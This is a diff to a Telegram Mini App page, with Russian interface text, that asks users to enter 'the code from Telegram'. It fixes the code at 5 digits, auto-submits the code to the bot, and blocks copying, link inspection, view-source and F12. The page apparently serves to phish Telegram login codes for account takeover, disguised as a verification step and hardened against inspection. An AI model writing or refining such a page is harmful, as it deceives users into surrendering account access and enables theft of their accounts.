@@ -179,6 +179,26 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        .error-message {
+            color: #ff6b6b;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 16px;
+            display: none;
+        }
+        
+        .error-message.active {
+            display: block;
+        }
+        
+        .info-message {
+            color: #8a2be2;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
     </style>
 </head>
 <body>
@@ -188,9 +208,15 @@
             <p>Введите код из Telegram</p>
         </div>
         
+        <div id="errorMessage" class="error-message"></div>
+        
         <div class="code-display">
             <div id="codeDisplay" class="code-input"></div>
             <div id="codePlaceholder" class="code-placeholder">_____</div>
+        </div>
+        
+        <div class="info-message">
+            Код состоит из 5 цифр
         </div>
         
         <div class="keypad">
@@ -218,14 +244,29 @@
         </div>
         
         <div class="footer">
-            Введите код из Telegram для подтверждения
+            Введите 5-значный код из Telegram
         </div>
     </div>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        let tg = window.Telegram.WebApp;
+        // Проверка, открыто ли в Telegram
+        let tg = window.Telegram?.WebApp;
+        
+        // Если не в Telegram - показываем ошибку и блокируем
+        if (!tg) {
+            document.body.innerHTML = `
+                <div style="text-align: center; padding: 50px 20px;">
+                    <h1 style="color: #ff6b6b;">❌ Доступ запрещен</h1>
+                    <p style="color: white; margin-top: 20px;">Это приложение работает только внутри Telegram бота.</p>
+                    <p style="color: #b8b8b8; margin-top: 20px;">Пожалуйста, откройте через бота: @your_bot_username</p>
+                </div>
+            `;
+            throw new Error("Not in Telegram");
+        }
+        
         let code = '';
+        const MAX_CODE_LENGTH = 5; // ИСПРАВЛЕНО: максимум 5 цифр для Telegram
         
         // Настройка темы
         tg.setHeaderColor('#1a1a2e');
@@ -234,6 +275,49 @@
         
         // Отправляем готовность
         tg.ready();
+        
+        // Блокируем контекстное меню (чтобы нельзя было скопировать ссылку)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Блокируем выделение текста
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Блокируем долгое нажатие на мобильных
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
+        // Блокируем стандартные сочетания клавиш
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+C, Ctrl+V, Ctrl+S, Ctrl+U
+            if (e.ctrlKey && ['c', 'v', 's', 'u'].includes(e.key.toLowerCase())) {
+                e.preventDefault();
+                return false;
+            }
+            // F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Функция для показа ошибки
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('active');
+            setTimeout(() => {
+                errorDiv.classList.remove('active');
+            }, 3000);
+        }
         
         function updateDisplay() {
             const display = document.getElementById('codeDisplay');
@@ -250,10 +334,20 @@
         }
         
         function addDigit(digit) {
-            if (code.length < 6) {
+            if (code.length < MAX_CODE_LENGTH) {
                 code += digit;
                 updateDisplay();
                 tg.HapticFeedback.impactOccurred('light');
+                
+                // Если достигли 5 цифр, можно автоматически подтверждать
+                if (code.length === MAX_CODE_LENGTH) {
+                    // Задержка 300мс для лучшего UX
+                    setTimeout(() => {
+                        submitCode();
+                    }, 300);
+                }
+            } else {
+                showError(`Максимум ${MAX_CODE_LENGTH} цифр`);
             }
         }
         
@@ -278,8 +372,8 @@
         }
         
         function submitCode() {
-            if (code.length < 5) {
-                tg.showAlert('Пожалуйста, введите полный код (5-6 цифр)');
+            if (code.length !== MAX_CODE_LENGTH) {
+                showError(`Введите полный код (${MAX_CODE_LENGTH} цифр)`);
                 tg.HapticFeedback.notificationOccurred('error');
                 return;
             }
@@ -292,11 +386,20 @@
                 action: 'code_input',
                 code: code
             }));
+            
+            // Закрываем через 2 секунды если что-то пошло не так
+            setTimeout(() => {
+                hideLoading();
+            }, 2000);
         }
         
         // Обработка закрытия
         tg.onEvent('viewportChanged', function() {
             tg.expand();
+        });
+        
+        tg.onEvent('themeChanged', function() {
+            // Обновляем тему если нужно
         });
         
         // Основной цикл
